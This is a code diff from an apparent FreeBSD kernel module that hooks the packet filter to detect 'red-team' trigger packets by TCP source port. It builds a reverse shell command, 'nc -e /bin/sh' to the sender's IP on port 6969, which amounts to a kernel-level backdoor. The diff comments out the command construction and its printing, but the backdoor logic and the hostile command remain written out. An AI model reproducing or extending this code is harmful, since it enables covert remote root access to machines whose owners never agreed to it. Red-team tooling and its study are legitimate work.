@@ -43,7 +43,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     ip_header = mtod(m, struct ip *);
     // Check if it's a TCP packet
     if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
-    
+
     // Extract the TCP header
     tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
     // Check source port
@@ -60,22 +60,22 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     // now we know the packet is a red-team packet
     // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
     char attacker_ip_str[16];
-    snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
-        (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
-        (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
-        (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
-        ntohl(ip_header->ip_src.s_addr) & 0xFF);
+    //snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
+        // (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
+        // (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
+        // (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
+        // ntohl(ip_header->ip_src.s_addr) & 0xFF);
 
     // Construct the reverse shell command
     char reverse_shell_cmd[100];
-    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-        "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
+    //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
+       // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
     printf("The reverse shell command is\n");
     printf("The reverse shell command is\n");
     printf("The reverse shell command is\n");
-    printf("%s\n", reverse_shell_cmd);
-    printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
+    //printf("%s\n", reverse_shell_cmd);
+    //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
     
     return PFIL_PASS;
 
